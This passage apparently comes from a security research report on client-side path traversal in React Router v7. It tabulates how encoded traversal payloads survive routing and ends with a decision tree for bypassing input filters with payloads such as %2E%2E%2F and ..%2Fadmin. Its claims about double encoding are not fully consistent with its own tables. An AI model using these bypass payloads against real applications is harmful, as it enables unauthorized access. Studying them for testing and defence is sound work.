# 4. Comprehensive Encoding Matrix (All Encoding Types)

Beyond standard percent-encoding, every encoding scheme was tested empirically against React Router v7's `decodePath()` + `matchPath()` pipeline.

## Overlong UTF-8

Overlong sequences encode ASCII characters using more UTF-8 bytes than necessary. Classic server-side bypass technique.

| Encoding | Target Char | `useParams()` | Exploitable? |
|----------|-------------|---------------|-------------|
| `%C0%AF` (2-byte overlong `/`) | `/` | `%C0%AF` (raw) | NO - decodeURIComponent rejects invalid UTF-8 |
| `%E0%80%AF` (3-byte overlong `/`) | `/` | `%E0%80%AF` (raw) | NO - same rejection |
| `%F0%80%80%AF` (4-byte overlong `/`) | `/` | `%F0%80%80%AF` (raw) | NO - same rejection |
| `%C0%AE` (2-byte overlong `.`) | `.` | `%C0%AE` (raw) | NO - same rejection |
| `%E0%80%AE` (3-byte overlong `.`) | `.` | `%E0%80%AE` (raw) | NO - same rejection |
| `%C0%AE%C0%AE%C0%AF` (overlong `../`) | `../` | `%C0%AE%C0%AE%C0%AF` (raw) | NO - falls back to raw |

**Why:** `decodeURIComponent()` is strict - it throws `URIError` on invalid UTF-8 byte sequences. React Router's `decodePath()` catches this and returns the raw string. No decode = no traversal.

## Unicode Homoglyph Characters

Characters that LOOK like `.` or `/` but are different codepoints.

| Character | Codepoint | `useParams()` | Treated as `.` or `/`? |
|-----------|-----------|---------------|----------------------|
| `．` FULLWIDTH FULL STOP | U+FF0E | `．` (preserved) | NO |
| `／` FULLWIDTH SOLIDUS | U+FF0F | `／` (preserved) | NO |
| `．．／admin` fullwidth `../` | U+FF0E+FF0E+FF0F | `．．／admin` | NO - not ASCII, no traversal |
| `․` ONE DOT LEADER | U+2024 | `․` (preserved) | NO |
| `‥` TWO DOT LEADER | U+2025 | `‥` (preserved) | NO |
| `﹒` SMALL FULL STOP | U+FE52 | `﹒` (preserved) | NO |
| `⁄` FRACTION SLASH | U+2044 | `⁄` (preserved) | NO |
| `∕` DIVISION SLASH | U+2215 | `∕` (preserved) | NO |
| `＼` FULLWIDTH BACKSLASH | U+FF3C | `＼` (preserved) | NO |

**Why:** React Router uses `decodeURIComponent()` which only handles percent-encoding. It does not perform Unicode normalization (NFC/NFKC). These codepoints pass through as-is and are NOT equivalent to ASCII `.` or `/` at any point in the pipeline.

## Unicode Normalization (NFC / NFKC)

Does React Router normalize Unicode? Tested with chars that change under NFC/NFKC.

| Input | Codepoint | `useParams()` display | Actual codepoint in params | NFC applied? |
|-------|-----------|----------------------|---------------------------|-------------|
| U+2126 OHM SIGN | 2126 | `Ω` (looks like Omega) | **U+2126** (verified) | NO |
| U+212A KELVIN SIGN | 212A | `K` (looks like K) | **U+212A** (verified) | NO |
| U+212B ANGSTROM SIGN | 212B | `Å` (looks like A-ring) | **U+212B** (verified) | NO |
| U+FB01 fi LIGATURE | FB01 | `ﬁ` (ligature) | **U+FB01** (verified) | NO (NFKC would → "fi") |

**Verified via `codePointAt(0).toString(16)`**: `decodeURIComponent` returns the raw codepoint. No normalization happens anywhere in React Router. The visual similarity in browser display is misleading - the actual bytes are different.

**Parser differential opportunity:** If a backend applies NFKC normalization, U+FF0E+FF0E+FF0F (fullwidth `../`) would normalize to ASCII `../`. React Router preserves the original codepoints, but a normalizing backend might interpret them as traversal.

## Zero-Width & Invisible Characters

| Character | Codepoint | `useParams()` | Preserved? |
|-----------|-----------|---------------|-----------|
| ZERO WIDTH SPACE | U+200B | `hel​lo` (invisible char between) | YES - passes through |
| ZERO WIDTH NON-JOINER | U+200C | `hel‌lo` | YES |
| ZERO WIDTH JOINER | U+200D | `hel‍lo` | YES |
| BOM / ZERO WIDTH NO-BREAK SPACE | U+FEFF | `﻿admin` (BOM prefixed) | YES |
| SOFT HYPHEN | U+00AD | `hel­lo` | YES |

**All pass through React Router unchanged.** These can be injected into path params. Implications:
- BOM prefix (`%EF%BB%BF`) before a path segment could confuse backend parsers
- Zero-width chars between dots (`.%E2%80%8B.`) make `..` look like two separate chars to simple regex validation but might be stripped by some normalizers
- Soft hyphen between dots: `.%C2%AD.%2Fadmin` → useParams = `.­./admin` (three visible chars, not `..`)

## BiDi / Directional Characters

| Character | Codepoint | `useParams()` | Preserved? |
|-----------|-----------|---------------|-----------|
| RIGHT-TO-LEFT OVERRIDE | U+202E | `‮admin` | YES |
| RIGHT-TO-LEFT MARK | U+200F | `‏admin` | YES |
| LEFT-TO-RIGHT ISOLATE | U+2066 | `⁦admin` | YES |

**All pass through.** RTL override could visually reverse displayed path segments in UIs, potentially masking malicious paths in logs or error messages.

## Combining Characters

| Test | `useParams()` | Notes |
|------|---------------|-------|
| U+0338 COMBINING LONG SOLIDUS OVERLAY on `o` | `hello̸world` | Preserved - combines with previous char visually |

React Router does not strip or normalize combining characters. They attach to the preceding codepoint.

## Case Sensitivity of Percent Encoding

| Encoding | `useParams()` | Works? |
|----------|---------------|--------|
| `%2F` (uppercase) | `/` | YES |
| `%2f` (lowercase) | `/` | YES |
| `%2E%2E%2F` (upper) | `../admin` | YES |
| `%2e%2e%2f` (lower) | `../admin` | YES |

**Both cases work.** `decodeURIComponent` is case-insensitive for hex digits per the spec. Both `%2f` and `%2F` decode to `/`.

## Invalid / Malformed Percent Encoding

| Input | `useParams()` | Behavior |
|-------|---------------|----------|
| `%ZZ` (invalid hex) | `%ZZ` (raw) | Fallback - returned as-is |
| `%2` (incomplete) | `%2` (raw) | Fallback |
| `%G1` (invalid hex) | `%G1test` (raw) | Fallback |
| `%` alone | `test%` (raw) | Fallback |
| `%0` (single digit) | `%0test` (raw) | Fallback |

**All malformed sequences are returned raw** thanks to the try/catch in `decodePath()`. This is safe - no partial decode, no corruption. The raw `%XX` string passes through unchanged.

## Triple Encoding

| Input | `useParams()` | Decode chain |
|-------|---------------|-------------|
| `%25252F` | `%252F` | Only one decode level: `%25`→`%`, result=`%252F`. Line 811 doesn't match (no `%2F` substring). |
| `%252E%252E%252F` | `%2E%2E/` | `%25`→`%` gives `%2E%2E%2F`. Line 811 replaces `%2F`→`/`. Dots stay encoded. |

**Triple encoding partially decodes.** The `%2F`→`/` replacement at line 811 still fires if a `%2F` literal exists after the first decode pass. But `%2E` stays as `%2E` (line 811 only targets `%2F`).

## Mixed Encoding (Combining Literal + Percent-Encoded)

| Input | `useParams()` | Exploitable? |
|-------|---------------|-------------|
| `..%2Fadmin` (literal dots + encoded /) | `../admin` | YES |
| `%2E.%2Fadmin` (one encoded dot + one literal + encoded /) | `../admin` | YES |
| `%2E%2E` + literal `/admin` | Route breaks (/ creates new segment) | Different behavior |

**Mixed encoding works for traversal.** You can mix literal `.` with encoded `%2E` and encoded `%2F` freely. React Router decodes each encoded char and the result is the same.

## Backslash Handling

| Input | `useParams()` | Notes |
|-------|---------------|-------|
| `%5C` (encoded backslash) | `\` | Decoded to literal backslash |
| `..%5Cadmin` | `..\admin` | Decoded but `\` is NOT `/` - no path traversal via backslash |

**Backslash is decoded but not treated as a path separator.** React Router (and browsers) only use `/` for path navigation. `..\\admin` does not traverse.

## Splat Route (`*`) Encoding Behavior

Splat params use `(.*)` regex and capture across `/` boundaries. Same encoding rules apply:

| Input | `params["*"]` | Key difference from named params |
|-------|---------------|--------------------------------|
| `a%2Fb%2Fc` | `a/b/c` | Same decode, but splat captures multiple segments |
| `a/b%2Fc/d` | `a/b/c/d` | Real `/` and decoded `%2F` are indistinguishable in result |
| `%2E%2E%2Fapi%2Fadmin` | `../api/admin` | Full traversal |
| `%252E%252E%252F` | `%2E%2E/` | Triple: same as named params |
| `%C0%AE%C0%AE%C0%AF` | `%C0%AE%C0%AE%C0%AF` | Overlong rejected, same as named |
| `.%C2%AD.%2Fadmin` | `.­./admin` | Soft hyphen preserved |
| `%EF%BB%BFadmin` | `﻿admin` | BOM prefix preserved |

**Splat params have identical encoding behavior to named params**, but are more dangerous because they also capture real `/` characters, giving the attacker multi-segment traversal without needing encoding at all.

## JavaScript Source-Level Escapes

| Escape | In URL context | Result |
|--------|---------------|--------|
| `\u002F` in JS string | Resolved to `/` at JS parse time | Creates real path separator BEFORE pushState |
| `\x2F` in JS string | Same - resolved at parse time | Same |
| Octal `\057` in JS string | Same | Same |

**These are NOT URL-level encodings.** JavaScript resolves `\u`, `\x`, and octal escapes when parsing the source code string. By the time the string reaches `pushState()` or `history.push()`, the escape is already a literal character. Not relevant for URL-based CSPT payloads sent from an attacker's link.

## Encoding Decision Tree (Which Bypasses Work?)

```
Can you control a URL path segment that flows to useParams()?
  |
  YES
  |
  v
Use standard percent-encoding: %2E%2E%2F (../), %2F (/)
  |
  Works? ──YES──> CSPT confirmed
  |
  NO (input validation strips %2E or %2F?)
  |
  v
Try double-encoding: %252E%252E%252F
  |
  Works? ──YES──> Bypasses single-layer validation
  |               (React Router double-decodes path params)
  |
  NO (validation also catches %25?)
  |
  v
Try mixed literal + encoded: ..%2F or %2E.%2F
  |
  Works? ──YES──> Bypasses pattern-specific filters
  |
  NO (strict allowlist validation?)
  |
  v
Try case variation: %2e%2e%2f (lowercase hex)
  |
  Works? ──YES──> Bypasses case-sensitive filters
  |
  NO
  |
  v
These DO NOT work in React Router:
  - Overlong UTF-8 (%C0%AF, %C0%AE) → rejected by decodeURIComponent
  - Fullwidth Unicode (．．／) → not normalized to ASCII
  - Backslash (..\\) → not treated as path separator
  - Zero-width chars between dots → not stripped
  - Unicode homoglyphs → preserved as-is, no NFKC
```
